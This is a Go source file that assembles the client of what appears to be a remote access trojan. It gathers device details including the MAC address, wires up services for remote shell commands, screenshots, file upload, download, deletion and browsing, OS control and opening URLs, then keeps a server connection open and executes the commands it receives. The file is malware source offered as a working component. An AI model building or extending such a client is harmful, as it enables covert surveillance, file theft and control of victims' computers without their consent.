package app

import (
	"context"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/environment"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/gateways/client"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/handler"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/delete"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/download"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/explorer"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/information"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/os"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/screenshot"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/terminal"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/upload"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/services/url"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxclient/app/utils/network"
	"golang.org/x/sync/errgroup"
	"log"
)

type App struct {
	Handler *handler.Handler
}

func New(configuration *environment.Configuration) *App {
	infoService := information.NewService(configuration.Server.HttpPort)

	deviceSpecs, err := infoService.LoadDeviceSpecs()
	if err != nil {
		log.Fatal("error loading device specs: ", err)
	}

	httpClient := network.NewHttpClient(10)

	operatingSystem := os.DetectOS()
	terminalService := terminal.NewService()

	clientGateway := client.NewGateway(configuration, httpClient)

	clientServices := &services.Services{
		Information: infoService,
		Terminal:    terminalService,
		Screenshot:  screenshot.NewService(),
		Download:    download.NewService(configuration, clientGateway),
		Upload:      upload.NewService(configuration, httpClient),
		Delete:      delete.NewService(),
		Explorer:    explorer.NewService(),
		OS:          os.NewService(configuration, terminalService, operatingSystem),
		URL:         url.NewURLService(terminalService, operatingSystem),
	}

	return &App{handler.NewHandler(
		configuration, clientGateway, clientServices, deviceSpecs.MacAddress)}
}

func (a *App) Run() {
	g, _ := errgroup.WithContext(context.Background())

	g.Go(func() error {
		a.Handler.KeepConnection()
		return nil
	})

	g.Go(func() error {
		a.Handler.HandleCommand()
		return nil
	})

	g.Wait()
}
